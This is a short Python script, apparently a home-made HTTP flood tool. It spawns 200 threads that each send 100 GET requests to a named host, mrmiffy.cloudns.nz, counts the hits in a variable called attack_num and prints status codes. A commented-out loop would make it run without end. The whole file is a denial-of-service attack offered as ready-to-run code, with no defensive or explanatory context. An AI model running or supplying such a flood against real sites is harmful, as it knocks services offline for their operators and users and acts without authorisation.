import requests
import threading
import os
import time

url = "https://mrmiffy.cloudns.nz/"
attack_num = 0

start = time.time()

def attack():
    # while True:
    for x in range(100):
        r = requests.get(url)
        global attack_num
        attack_num += 1
        print(f'{attack_num} | {r.status_code}')

for i in range(200):
    thread = threading.Thread(target=attack)
    thread.start()

end = time.time()

t_time = end - start